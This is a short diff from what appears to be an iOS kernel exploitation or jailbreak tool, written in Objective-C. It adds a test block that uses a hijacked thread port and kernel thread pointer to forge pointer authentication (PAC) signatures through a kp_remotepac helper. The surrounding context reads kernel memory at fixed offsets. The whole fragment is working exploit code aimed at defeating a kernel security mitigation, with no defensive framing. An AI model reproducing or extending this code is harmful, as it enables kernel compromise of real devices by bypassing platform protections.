@@ -2435,6 +2435,14 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                 mach_port_t hp = savedThPort;
                                 uint64_t hK = thK;
                                 klog([NSString stringWithFormat:@"use BOOT pair port=0x%x thread*=%#llx", hp, (unsigned long long)hK]);
+                                // 2.0.141: PAC-sign тест
+                                {
+                                    uint64_t testAddr = kconstant(base) + 0x1000;
+                                    uint64_t discPC = kp_ptrauthstrdisc("pc");
+                                    klog([NSString stringWithFormat:@"calling kp_remotepac(addr=%#llx disc=%#llx)", (unsigned long long)testAddr, (unsigned long long)discPC]);
+                                    uint64_t signedAddr = kp_remotepac(hK, testAddr, discPC);
+                                    klog([NSString stringWithFormat:@"kp_remotepac → %#llx (signed=%d)", (unsigned long long)signedAddr, signedAddr != testAddr ? 1 : 0]);
+                                }
                                 if (hK && hp) {
                                     uint64_t oVA = hK + 0xC0;
                                     uint64_t o0 = early_kread64(oVA);
